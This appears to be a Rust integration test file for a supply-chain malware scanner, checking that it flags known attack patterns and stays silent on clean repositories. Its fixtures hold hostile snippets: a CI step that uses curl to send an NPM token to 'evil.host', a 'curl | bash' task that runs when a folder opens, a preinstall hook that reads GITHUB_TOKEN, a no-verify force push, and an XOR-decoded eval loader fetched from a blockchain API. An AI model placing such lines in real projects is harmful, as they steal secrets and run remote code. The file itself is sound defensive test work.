//! Campaign-agnostic integration: the capability engine catches PolinRider,
//! Shai-Hulud, TasksJacker, fake-font, propagation, exfil-staging and on-chain
//! C2 with NO pack loaded — and stays silent on a clean-repo corpus.

use std::fs;
use std::path::PathBuf;

use tempfile::TempDir;
use wormward_core::{scan_capabilities, FindingKind, WorkingTree};

fn repo_with(files: &[(&str, &str)]) -> (TempDir, PathBuf) {
    let tmp = TempDir::new().unwrap();
    let repo = tmp.path().join("proj");
    fs::create_dir_all(repo.join(".git")).unwrap();
    for (p, c) in files {
        let fp = repo.join(p);
        fs::create_dir_all(fp.parent().unwrap()).unwrap();
        fs::write(fp, c).unwrap();
    }
    (tmp, repo)
}

fn fires(files: &[(&str, &str)]) -> bool {
    let (_t, repo) = repo_with(files);
    let ft = WorkingTree::new(&repo);
    scan_capabilities(&repo, &ft)
        .iter()
        .any(|f| f.kind == FindingKind::Capability)
}

#[test]
fn polinrider_config_injection() {
    assert!(fires(&[(
        "postcss.config.mjs",
        "export default {};\nglobal.o='5-3-235-du';var _$_8e2c=[];fetch('https://x')"
    )]));
}

#[test]
fn glassworm_invisible_unicode_run() {
    // A run of variation-selector chars in a config file (Glassworm stego payload) fires.
    let run = "\u{FE00}\u{FE01}\u{FE02}\u{FE03}\u{FE04}";
    let content = format!("export default {{}};\nconst x = '{run}';");
    assert!(fires(&[("postcss.config.mjs", &content)]));
}

#[test]
fn trojan_source_bidi_override_fires() {
    let content = "export default {};\n// \u{202E}reordered comment";
    assert!(fires(&[("next.config.mjs", content)]));
}

#[test]
fn legit_emoji_and_rtl_not_flagged() {
    // FP guard: legit emoji (ZWJ family, variation selectors) and Arabic RTL text interleave
    // visible glyphs, so no 4-long invisible run forms — must NOT fire.
    let content = "export default {\n  greeting: '\u{1F468}\u{200D}\u{1F469}\u{200D}\u{1F467} \u{645}\u{631}\u{62D}\u{628}\u{627} \u{2705}\u{FE0F}',\n};";
    assert!(!fires(&[("postcss.config.mjs", content)]));
}

#[test]
fn shai_hulud_dropped_file_via_reachability() {
    assert!(fires(&[
        ("package.json", r#"{"scripts":{"preinstall":"node setup_bun.js"}}"#),
        (
            "setup_bun.js",
            "global['r']=require;String.fromCharCode(1,2,3,4,5);process.env.GITHUB_TOKEN;require('https')"
        ),
    ]));
}

#[test]
fn github_actions_secret_exfil() {
    assert!(fires(&[(
        ".github/workflows/ci.yml",
        "on: push\njobs:\n  x:\n    steps:\n      - run: curl -d \"${{ secrets.NPM_TOKEN }}\" https://evil.host"
    )]));
}

#[test]
fn tasksjacker_folderopen_curl_bash() {
    assert!(fires(&[(
        ".vscode/tasks.json",
        "{\"tasks\":[{\"runOptions\":{\"runOn\":\"folderOpen\"},\"command\":\"curl http://x/t | bash\"}]}"
    )]));
}

#[test]
fn fake_font_is_js() {
    assert!(fires(&[(
        "public/fonts/fa-solid-400.woff2",
        "var x=require('fs');eval(global['p'])"
    )]));
}

#[test]
fn propagation_bat() {
    assert!(fires(&[(
        "temp_auto_push.bat",
        "git commit --amend --no-verify\ngit push -uf --no-verify"
    )]));
}

#[test]
fn exfil_staging_data_json() {
    assert!(fires(&[("data.json", "eyJhY2Nlc3MiOiJ0b2tlbiJ9\nZm9vYmFy==")]));
}

#[test]
fn on_chain_c2() {
    assert!(fires(&[(
        "next.config.js",
        "module.exports={};fetch('https://api.trongrid.io/v1/accounts/T/transactions').then(r=>{for(i in b)o+=String.fromCharCode(b.charCodeAt(i)^7);eval(o)})"
    )]));
}

#[test]
fn multiline_config_with_proxy_url_is_silent() {
    // Regression: a benign multi-line vite config whose object body spans lines and
    // embeds a proxy URL must NOT be flagged (was a false Critical via trailing_code).
    assert!(!fires(&[(
        "vite.config.ts",
        "import { defineConfig } from 'vite'\nimport react from '@vitejs/plugin-react'\n\nexport default defineConfig({\n  plugins: [react()],\n  server: { proxy: { '/api': 'https://api.example.com' } },\n})\n"
    )]));
}

// --- clean-corpus regression: must stay SILENT ---
#[test]
fn clean_repo_silent() {
    assert!(!fires(&[
        (
            "postcss.config.mjs",
            "export default { plugins: { tailwindcss: {}, autoprefixer: {} } };\n"
        ),
        (
            "vite.config.ts",
            "import { defineConfig } from 'vite';\nexport default defineConfig({ plugins: [] });\n"
        ),
        (
            "package.json",
            r#"{"scripts":{"build":"vite build","test":"vitest","postinstall":"husky install"}}"#
        ),
        (
            "src/index.js",
            "import App from './App';\nfetch('/api/data').then(r=>r.json());\nexport default App;\n"
        ),
        (
            ".github/workflows/ci.yml",
            "on: push\njobs:\n  test:\n    steps:\n      - run: npm ci && npm test\n"
        ),
        (
            "scripts/deploy.sh",
            "#!/bin/sh\nset -e\nnpm run build\ngit push origin main\n"
        ),
    ]));
}
